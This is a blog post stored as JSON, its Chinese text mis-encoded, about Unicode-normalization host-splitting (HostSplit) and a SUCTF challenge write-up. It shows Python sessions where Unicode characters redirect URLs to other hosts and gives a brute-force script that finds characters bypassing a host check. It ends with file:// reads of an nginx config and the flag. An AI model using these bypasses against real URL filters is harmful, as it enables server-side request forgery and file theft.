{"title":"HostSplit-Exploitable","slug":"HostSplit","date":"2019-08-22T03:39:23.000Z","updated":"2019-09-03T14:21:11.682Z","comments":true,"path":"api/articles/HostSplit.json","photos":[],"link":"","excerpt":"ğŸ±é»‘å¸½å¤§ä¼šè®®é¢˜","covers":["http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg","http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg"],"content":"<p>ğŸ±é»‘å¸½å¤§ä¼šè®®é¢˜</p>\n<a id=\"more\"></a>\n<p>8/22/2019 11:39:23 AM </p>\n<h1 id=\"HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-å­¦ä¹ \"><a href=\"#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-å­¦ä¹ \" class=\"headerlink\" title=\"HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization å­¦ä¹ \"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization å­¦ä¹ </h1><h2 id=\"IDN-ä¸-UTF-8\"><a href=\"#IDN-ä¸-UTF-8\" class=\"headerlink\" title=\"IDN ä¸ UTF-8\"></a>IDN ä¸ UTF-8</h2><p><strong>IDN</strong></p>\n<blockquote>\n<p>å›½é™…åŒ–åŸŸåIDNs (Internationalized Domain Names)ä¹Ÿç§°å¤šè¯­ç§åŸŸåï¼Œæ˜¯æŒ‡éè‹±è¯­å›½å®¶ä¸ºæ¨å¹¿æœ¬å›½è¯­è¨€çš„åŸŸåç³»ç»Ÿçš„ä¸€ä¸ªæ€»ç§°ï¼Œä¾‹å¦‚å«æœ‰æ—¥æ–‡çš„ä¸ºæ—¥æ–‡åŸŸåï¼Œå«æœ‰ä¸­æ–‡çš„åŸŸåä¸ºä¸­æ–‡åŸŸåã€‚<br>ç§‘ç ”äººå‘˜åˆå°†çº¯æ•°å­—è¡¨ç¤ºçš„IPåœ°å€åŸºç¡€ä¸Šæ¨å‡ºæ›´åŠ ä¾¿äºè®°å¿†çš„å­—ç¬¦å‹è®¿é—®æ ‡è¯†ï¼Œå³åŸºäºIPåœ°å€çš„åŸŸåç³»ç»Ÿã€‚è¿™äº›åŸŸååªèƒ½ä½¿ç”¨63ä¸ªASCIIå­—ç¬¦ï¼ˆâ€a-zâ€ï¼Œâ€A-Zâ€ï¼Œâ€0-9â€ï¼Œâ€-â€œï¼‰. éšç€äº’è”ç½‘åœ¨éè‹±è¯­å›½å®¶çš„è¿…çŒ›å‘å±•ï¼Œä¹åå¹´ä»£æœ«æœŸå›½é™…äº’è”ç½‘ç•Œæå‡ºäº†å°†åŸæœ¬åªèƒ½ä½¿ç”¨63ä¸ªASCIIå­—ç¬¦çš„åŸŸåï¼Œé‡‡ç”¨æœ¬åœ°è¯­è¨€æ–‡å­—æ¥è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯å‡ºç°äº†å¯¹å¤šè¯­ç§åŸŸåçš„éœ€æ±‚ã€‚</p>\n</blockquote>\n<p><a href=\"http://ä¸­å›½æ”¿åºœ.æ”¿åŠ¡/\" target=\"_blank\" rel=\"noopener\">http://ä¸­å›½æ”¿åºœ.æ”¿åŠ¡/</a></p>\n<p>è¿™æ˜¯æˆ‘å›½çš„æ”¿åºœç½‘ç«™ï¼</p>\n<p><strong>UTF-8</strong></p>\n<blockquote>\n<p>UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§é’ˆå¯¹Unicodeçš„å¯å˜é•¿åº¦å­—ç¬¦ç¼–ç ï¼Œç”±Ken Thompsonäº1992å¹´åˆ›å»ºï¼Œç°åœ¨å·²ç»æ ‡å‡†åŒ–ä¸ºRFC 3629ã€‚UTF-8ç”¨1åˆ°4ä¸ªå­—èŠ‚ç¼–ç Unicodeå­—ç¬¦ã€‚ç”¨åœ¨ç½‘é¡µä¸Šå¯ä»¥ç»Ÿä¸€é¡µé¢æ˜¾ç¤ºä¸­æ–‡ç®€ä½“ç¹ä½“åŠå…¶å®ƒè¯­è¨€.</p>\n</blockquote>\n<p>Puny ç¼–ç  (Punycode)</p>\n<blockquote>\n<p>è¿™æ˜¯ä¸€ä¸ªç®€æ˜“è€Œå‡†ç¡®çš„IDN ASCII ç¼–ç ç³»ç»Ÿ (ASCII-Compatible Encoding (ACE))ã€‚å®ƒèƒ½è½¬æ¢ä¸€ç³»åˆ—çš„ å­—ç¬¦ç¼–ç æˆä¸ºå­—ç¬¦ä»¥ç¬¦åˆä¸»æœºåç§°(hostname)æ ‡å‡† (ASCII å­—æ¯ï¼Œæ•°ä½å’Œè¿å­—ç¬¦å·)ã€‚<br>ä¾‹: xnâ€“0zwm56d.test </p>\n</blockquote>\n<pre><code>ä¸­å›½.æ”¿åºœ-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id=\"Unicode-â”-ASCII-â€“-A-Two-Step-Process\"><a href=\"#Unicode-â”-ASCII-â€“-A-Two-Step-Process\" class=\"headerlink\" title=\"Unicode â” ASCII â€“ A Two Step Process\"></a>Unicode â” ASCII â€“ A Two Step Process</h2><ol>\n<li>Normalization Convert characters to a â€œstandardized formâ€.</li>\n<li>Punycoding Turn Unicode into ASCII.</li>\n</ol>\n<p>æ„æ€å°±æ˜¯è¯´IDNçš„ä½¿ç”¨åº•å±‚è¿˜æ˜¯ASCIIçš„åŠŸåŠ³ã€‚å…ˆè½¬æ¢æˆæ ‡å‡†å½¢å¼ç„¶åè¿›è¡Œpunyç¼–ç ã€‚</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg\" alt=\"è½¬æ¢è¿‡ç¨‹\"></p>\n<h2 id=\"Splitting-Hostnames\"><a href=\"#Splitting-Hostnames\" class=\"headerlink\" title=\"Splitting Hostnames\"></a>Splitting Hostnames</h2><pre><code>https://evil.câ„€.Example.com</code></pre><p>æˆ‘ä»¬å¯¹ä»–è¿›è¡Œè½¬æ¢æˆASCIIä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg\" alt=\"Normalizing \"></p>\n<pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything â€“ itâ€™s all ASCII now!</strong>ä¹Ÿå°±æ˜¯ä¸ç”¨å†æ¬¡ç¼–ç å·²ç»å¯ä»¥è§£æäº†</p>\n<h2 id=\"python-utf-8-unicode-asciiäº’è½¬\"><a href=\"#python-utf-8-unicode-asciiäº’è½¬\" class=\"headerlink\" title=\"python utf-8,unicode,asciiäº’è½¬\"></a>python utf-8,unicode,asciiäº’è½¬</h2><p>unicode-&gt;ascii</p>\n<pre><code>&gt;&gt;&gt; ord(u&apos;è„‘&apos;)\n33041</code></pre><p>ascii-&gt;unicode</p>\n<pre><code>&gt;&gt;&gt; chr(33041)\n&apos;è„‘</code></pre><p>unicode &lt;=&gt; utf-8</p>\n<pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)\n&gt;&gt;&gt; n\nb&apos;\\xe5\\xb1\\x8c&apos;\n\n&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>æ³¨ï¼šlinuxé»˜è®¤ç¼–ç ä¸ºunicodeï¼Œè‹¥ä¸ºå…¶ä»–ä¸¤ç§ç¼–ç è¿›è¡Œè½¬æ¢ï¼Œéœ€unicodeä½œä¸ºâ€œåª’ä»‹</p>\n<h2 id=\"Python-was-vulnerable\"><a href=\"#Python-was-vulnerable\" class=\"headerlink\" title=\"Python was vulnerable\"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit \n&gt;&gt;&gt; url = &apos;http://canada.câ„€.microsoft.com/some.txt&apos; \n&gt;&gt;&gt; parts = list(urlsplit(url)) \n&gt;&gt;&gt; host = parts[1] \n&gt;&gt;&gt; host &apos;canada.câ„€.microsoft.com&apos; \n&gt;&gt;&gt; newhost = [] \n&gt;&gt;&gt; for h in host.split(&apos;.&apos;): \n... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) \n... \n&gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) \n&gt;&gt;&gt; finalUrl = urlunsplit(parts) \n&gt;&gt;&gt; finalUrl \n&apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id=\"Python-had-an-extra-variant\"><a href=\"#Python-had-an-extra-variant\" class=\"headerlink\" title=\"Python had an extra variant\"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse \n&gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\\uFF03&apos;+&apos;:password@products.office.com&apos; \n&gt;&gt;&gt; o = urlparse(r) \n&gt;&gt;&gt; o.hostname &apos;products.office.com&apos; \n&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) \n&gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; \n&gt;&gt;&gt; o = urlparse(a) \n&gt;&gt;&gt; o.hostname \n&apos;bing.com&apos;</code></pre><h2 id=\"SUCTF-PythonNginx\"><a href=\"#SUCTF-PythonNginx\" class=\"headerlink\" title=\"SUCTF PythonNginx\"></a>SUCTF PythonNginx</h2><p>SUCTFä¸­çš„ä¸€é“é¢˜ï¼š</p>\n<pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef getUrl():\n    url = request.args.get(&quot;url&quot;)\n    host = parse.urlparse(url).hostname\n    if host == &apos;suctf.cc&apos;:\n        return &quot;æˆ‘æ‰Œ your problem? 111&quot;\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == &apos;suctf.cc&apos;:\n        return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host\n    newhost = []\n    for h in host.split(&apos;.&apos;):\n        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))\n    parts[1] = &apos;.&apos;.join(newhost)\n    #å»æ‰ url ä¸­çš„ç©ºæ ¼\n    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == &apos;suctf.cc&apos;:\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return &quot;æˆ‘æ‰Œ your problem? 333&quot;</code></pre><p>çˆ†ç ´æœ€åä¸€ä½c</p>\n<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit\nfrom urllib import parse\ndef get_unicode():\n    for x in range(65536):\n        uni=chr(x)\n        url=&quot;http://suctf.c{}&quot;.format(uni)\n        try:\n            if getUrl(url):\n                print(&apos;11&apos;)\n                print(&quot;str: &quot;+uni+&apos; unicode: \\\\u&apos;+str(hex(x))[2:])\n        except:\n            pass\n\n\ndef getUrl(url):\n    url = url\n    host = parse.urlparse(url).hostname\n    if host == &apos;suctf.cc&apos;:\n        return False\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == &apos;suctf.cc&apos;:\n        return False\n    newhost = []\n    for h in host.split(&apos;.&apos;):\n        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))\n    parts[1] = &apos;.&apos;.join(newhost)\n    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == &apos;suctf.cc&apos;:\n        return True\n    else:\n        return False\n\nif __name__==&quot;__main__&quot;:\n    get_unicode()\n\nstr: ï¿½G unicode: \\u2105\nstr: ï¿½ï¿½ unicode: \\uff23\nstr: ï¿½ï¿½ unicode: \\uff43\n[Finished in 6.5s]</code></pre><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹å„ä¸ªåˆ¤æ–­çš„ç»“æœ</p>\n<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit\nfrom urllib import parse\nurl = &apos;http://canada.câ„€.microsoft.com/some.txt&apos;\nparts = parse.urlparse(url)\n&gt;&gt;&gt; parts\nParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.câ„€.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)\n&gt;&gt;&gt; host = parts.hostname\n&gt;&gt;&gt; host\n&apos;canada.câ„€.microsoft.com&apos;\n&gt;&gt;&gt; parts1 = list(urlsplit(url))\n&gt;&gt;&gt; parts1\n[&apos;http&apos;, &apos;canada.câ„€.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥ç»•è¿‡åˆ¤æ–­äº†</p>\n<h3 id=\"hostsæ–‡ä»¶\"><a href=\"#hostsæ–‡ä»¶\" class=\"headerlink\" title=\"hostsæ–‡ä»¶\"></a>hostsæ–‡ä»¶</h3><p>Hostsæ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬ç­‰å·¥å…·æ‰“å¼€ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç³»ç»Ÿå†ä¼šå°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚</p>\n<h3 id=\"fileåè®®\"><a href=\"#fileåè®®\" class=\"headerlink\" title=\"fileåè®®\"></a>fileåè®®</h3><p>ä¸­æ–‡æ„æ€ï¼šæœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®<br>ä»€ä¹ˆæ˜¯Fileï¼šFileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå°±å¦‚åŒåœ¨Windowsèµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€æ–‡ä»¶ä¸€æ ·ã€‚<br>å¦‚ä½•ä½¿ç”¨Fileï¼šè¦ä½¿ç”¨Fileåè®®ï¼ŒåŸºæœ¬çš„æ ¼å¼å¦‚ä¸‹ï¼šfile:///æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚è¦æ‰“å¼€Fç›˜flashæ–‡ä»¶å¤¹ä¸­çš„1.swfæ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨èµ„æºç®¡ç†å™¨æˆ–æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥ï¼šfile:///f:/flash/1.swfå›è½¦ã€‚</p>\n<h3 id=\"nginxé…ç½®\"><a href=\"#nginxé…ç½®\" class=\"headerlink\" title=\"nginxé…ç½®\"></a>nginxé…ç½®</h3><p> Nginxçš„é…ç½®æ–‡ä»¶æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒä¸€èˆ¬ä½äºNginxå®‰è£…ç›®å½•çš„confç›®å½•ä¸‹ï¼Œæ•´ä¸ªé…ç½®æ–‡ä»¶æ˜¯ä»¥blockçš„å½¢å¼ç»„ç»‡çš„ã€‚æ¯ä¸ªblockä¸€èˆ¬ä»¥ä¸€ä¸ªå¤§æ‹¬å·â€œ{â€æ¥è¡¨ç¤ºã€‚block å¯ä»¥åˆ†ä¸ºå‡ ä¸ªå±‚æ¬¡ï¼Œæ•´ä¸ªé…ç½®æ–‡ä»¶ä¸­Mainå‘½ä»¤ä½äºæœ€é«˜å±‚ï¼Œåœ¨Mainå±‚ä¸‹é¢å¯ä»¥æœ‰Eventsã€ HTTPç­‰å±‚çº§ï¼Œè€Œåœ¨HTTPå±‚ä¸­åˆåŒ…å«Serverå±‚ï¼Œå³server block, serverblockä¸­åˆå¯åˆ†ä¸ºlocationå±‚ï¼Œå¹¶ä¸”ä¸€ä¸ªserver blockä¸­å¯ä»¥åŒ…å«å¤šä¸ªlocation blockã€‚</p>\n<p>nginxé…ç½®æ–‡ä»¶è·¯å¾„</p>\n<pre><code>[root@localhost vhost]# locate nginx.conf\n/usr/local/nginx/conf/nginx.conf\n/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hostsæ–‡ä»¶ç»‘å®šæœ¬åœ°å›ç¯åœ°å€ï¼Œå°è¯•fileè¯»æ–‡ä»¶</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg\" alt=\"å°è¯•è¯»æ–‡ä»¶\"></p>\n<p>è¯»nginxé…ç½®æ–‡ä»¶</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg\" alt=\"è¯»é…ç½®æ–‡ä»¶\"></p>\n<p>è¯»flag</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg\" alt=\"è¯»flag\"></p>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"python","slug":"python","count":1,"path":"api/tags/python.json"}]}